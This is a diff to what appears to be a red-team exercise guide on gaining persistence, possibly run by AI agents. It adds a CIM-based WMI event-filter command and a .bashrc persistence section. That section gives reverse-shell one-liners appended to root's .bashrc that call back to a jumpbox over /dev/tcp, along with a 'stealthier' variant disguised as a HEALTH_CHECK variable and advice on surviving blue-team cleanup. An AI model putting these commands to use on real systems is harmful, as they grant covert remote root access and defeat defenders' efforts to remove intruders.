@@ -102,6 +102,16 @@ Get-WmiObject -Namespace "root\subscription" -Class CommandLineEventConsumer -Fi
 Get-WmiObject -Namespace "root\subscription" -Class __FilterToConsumerBinding | Where-Object { $_.Filter -like "*SystemCoreTempFilter*" } | Remove-WmiObject
 ```
 
+Note: `Set-WmiInstance` is deprecated in PowerShell 7.x and newer Windows versions. If the target runs PS 7.x, use `New-CimInstance` instead:
+
+` ``powershell
+$class = [wmiclass]"\\.\root\subscription:__EventFilter"
+# ... or use the CIM cmdlets directly:
+New-CimInstance -Namespace "root/subscription" -ClassName __EventFilter -Property @{Name=$filterName; EventNamespace="root/cimv2"; QueryLanguage="WQL"; Query=$query}
+` ``
+
+Both methods create the same WMI objects. The WMI cmdlets work on PS 5.1 (default on Server 2016–2022 and Win10/11), while CIM cmdlets work on both PS 5.1 and 7.x.
+
 ### Service Creation
 
 Creating a new service is visible but extremely persistent — services start before user logon and run as SYSTEM by default. Choose service names that blend with legitimate services.
@@ -252,6 +262,29 @@ For a more functional web shell, ask PAYLOAD-001 to generate one with authentica
 Cleanup:
 ```
 rm /var/www/html/health.php
+```
+
+### Shell Profile Persistence (.bashrc / .profile)
+
+Modifying shell profile files executes commands every time a user opens a shell session. This survives password changes (the blue team resets root's password, but the next time they SSH in, your payload executes in their session). It is frequently overlooked by blue teams who focus on cron, services, and SSH keys.
+
+Append to root's .bashrc:
+```
+echo 'nohup bash -c "bash -i >& /dev/tcp/<jumpbox-IP>/4444 0>&1" &>/dev/null &' >> /root/.bashrc
+```
+
+For a stealthier approach that only triggers once per session and suppresses output:
+```
+echo '(if [ -z "$HEALTH_CHECK" ]; then export HEALTH_CHECK=1; nohup bash -c "sleep 5; bash -i >& /dev/tcp/<jumpbox-IP>/4444 0>&1" &>/dev/null & fi)' >> /root/.bashrc
+```
+
+This technique pairs well with SSH key persistence: even if the blue team finds and removes the SSH key, the .bashrc payload will execute the next time any user with that profile logs in.
+
+Cleanup:
+```
+# Remove the last line (or the specific payload line) from .bashrc
+sed -i '/HEALTH_CHECK/d' /root/.bashrc
+sed -i '/dev\/tcp/d' /root/.bashrc
 ```
 
 ## PERSISTENCE-MANIFEST.md Management
